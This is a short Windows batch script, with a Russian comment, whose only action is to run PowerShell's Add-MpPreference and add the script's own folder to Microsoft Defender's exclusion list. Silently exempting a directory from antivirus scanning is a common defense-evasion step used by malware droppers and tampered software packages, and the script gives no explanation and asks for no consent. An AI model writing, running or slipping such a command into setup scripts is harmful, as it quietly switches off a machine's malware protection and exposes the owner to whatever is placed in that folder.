@echo off

set "CURRENT_DIR=%~dp0"

:: Добавляем исключение для папки
powershell -Command "Add-MpPreference -ExclusionPath '%CURRENT_DIR%'"
